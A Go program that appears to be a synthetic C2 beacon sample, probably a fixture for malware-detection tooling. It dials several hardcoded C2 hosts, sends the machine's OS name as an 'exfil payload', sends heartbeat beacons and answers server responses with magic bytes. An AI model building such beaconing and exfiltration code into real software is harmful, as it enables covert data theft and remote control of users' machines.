package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"sync"
	"time"
)

// ---- Constants with embedded string data ----

const beaconUserAgent = "Mozilla/5.0 GoBot/2.0"
const beaconInterval = "heartbeat-interval-30s"

// ---- Types ----

type Config struct {
	c2   []string
	port int
}

func (c Config) test_c2_config() int {
	fmt.Println(c.c2[0])
	return -1
}

// Handler interface for beacon response dispatch
type Handler interface {
	Handle(msg string) error
}

// BeaconHandler implements the Handler interface
type BeaconHandler struct {
	id string
}

func (b *BeaconHandler) Handle(msg string) error {
	fmt.Printf("beacon-handler processing: %s\n", msg)
	return nil
}

// ---- Helper functions (nested call paths) ----

// sendBeacon writes an HTTP beacon request through an established connection
func sendBeacon(conn net.Conn, payload string) error {
	_, err := conn.Write([]byte("POST /api/beacon HTTP/1.1\r\n"))
	if err != nil {
		return fmt.Errorf("beacon-send-failed: %w", err)
	}
	_, err = conn.Write([]byte("X-Beacon-ID: alpha-7\r\n\r\n"))
	if err != nil {
		return fmt.Errorf("header-write-failed: %w", err)
	}
	_, err = conn.Write([]byte(payload))
	return err
}

// processResponse handles data received from C2 via interface dispatch
func processResponse(data []byte, handler Handler) {
	if len(data) == 0 {
		fmt.Println("empty-response-received")
		return
	}
	msg := string(data)
	fmt.Printf("response-length: %d\n", len(msg))
	handler.Handle(msg)
}

// buildPayload constructs the exfil payload string
func buildPayload(osInfo string) string {
	result := fmt.Sprintf("payload:%s:%s", osInfo, "payload-id-0xDEAD")
	fmt.Println("payload-constructed")
	return result
}

// ---- Goroutine functions ----

// goroutineBeacon performs a beacon attempt in a goroutine
func goroutineBeacon(addr string, wg *sync.WaitGroup, statusCh chan<- string) {
	defer wg.Done()
	fmt.Printf("goroutine-beacon-started: %s\n", addr)

	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		fmt.Printf("goroutine-connect-failed: %s\n", err.Error())
		statusCh <- "goroutine-beacon-failed"
		return
	}
	defer conn.Close()

	_, _ = conn.Write([]byte("GET /heartbeat HTTP/1.1\r\n\r\n"))
	statusCh <- "goroutine-beacon-success"
}

// channelMultiplexer handles status updates from beacon goroutines using select
func channelMultiplexer(statusCh <-chan string, done chan<- bool) {
	timeout := time.After(10 * time.Second)
	for {
		select {
		case msg, ok := <-statusCh:
			if !ok {
				done <- true
				return
			}
			fmt.Printf("channel-received: %s\n", msg)
			if msg == "all-beacons-complete" {
				done <- true
				return
			}
		case <-timeout:
			fmt.Println("select-timeout-reached")
			done <- false
			return
		}
	}
}

// ---- Main entry point ----

func main() {
	// Panic recovery with embedded string (defer + recover)
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("panic-recovery-triggered")
		}
	}()

	// Detect the operating system
	osInfo := runtime.GOOS
	fmt.Printf("Got OS info %s\n", osInfo)

	// C2 addresses with backup endpoint
	c2_addresses := []string{
		"[2606:4700:3035::ac43:cf7b]:443",
		"doesthispersonexist.com:80",
		"backup-c2.fallback.net:8443",
	}
	c2_config := Config{c2_addresses, 443}
	c2_config.test_c2_config()

	// Interface handler setup
	handler := &BeaconHandler{id: "handler-primary"}

	// Closure with embedded strings
	onConnect := func(addr string) {
		fmt.Printf("closure-connected: %s\n", addr)
		fmt.Println("closure-exfil-ready")
	}

	// Launch goroutine beacons for concurrent attempts
	var wg sync.WaitGroup
	statusCh := make(chan string, 10)
	done := make(chan bool, 1)

	go channelMultiplexer(statusCh, done)

	for _, addr := range c2_addresses {
		wg.Add(1)
		go goroutineBeacon(addr, &wg, statusCh)
	}

	// Primary connection loop
	var conn net.Conn
	var err error
	for _, v := range c2_config.c2 {
		conn, err = net.Dial("tcp6", v)
		if err != nil {
			fmt.Println("Error connecting baz:", err)
		} else {
			fmt.Printf("connected to: %s\n", v)
			onConnect(v)
			break
		}
	}
	if conn == nil {
		os.Exit(1)
	}
	defer conn.Close()

	// Deferred cleanup handler
	defer func() {
		fmt.Println("defer-cleanup-handler")
	}()

	// Build and send payload through nested call path
	payload := buildPayload(osInfo)
	err = sendBeacon(conn, payload)
	if err != nil {
		fmt.Printf("send-error: %s\n", err.Error())
	}

	// Send the operating system information over the socket
	_, err = conn.Write([]byte("GET /foo HTTP/1.1\n\n"))
	_, err = conn.Write([]byte(osInfo))
	if err != nil {
		fmt.Println("Error writing:", err)
		os.Exit(1)
	}

	// Headers map
	headers := map[string]string{
		"User-Agent": beaconUserAgent,
		"X-Custom":   "custom-header-value",
	}
	for k, v := range headers {
		fmt.Printf("header: %s=%s\n", k, v)
	}

	// Read data from the connection and print it to stdout
	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Error reading:", err)
			break
		}
		processResponse(buf[:n], handler)

		// Send magic back through the same connection
		fmt.Println("Writing magic")
		_, err = conn.Write([]byte{0x19, 0x80, 0x14, 0x06})
		if err != nil {
			fmt.Println("Error writing:", err)
			break
		}
	}

	// Wait for goroutines and signal completion
	wg.Wait()
	statusCh <- "all-beacons-complete"

	success := <-done
	if !success {
		fmt.Println("beacon-timeout-error")
	}
	fmt.Println(beaconInterval)
}
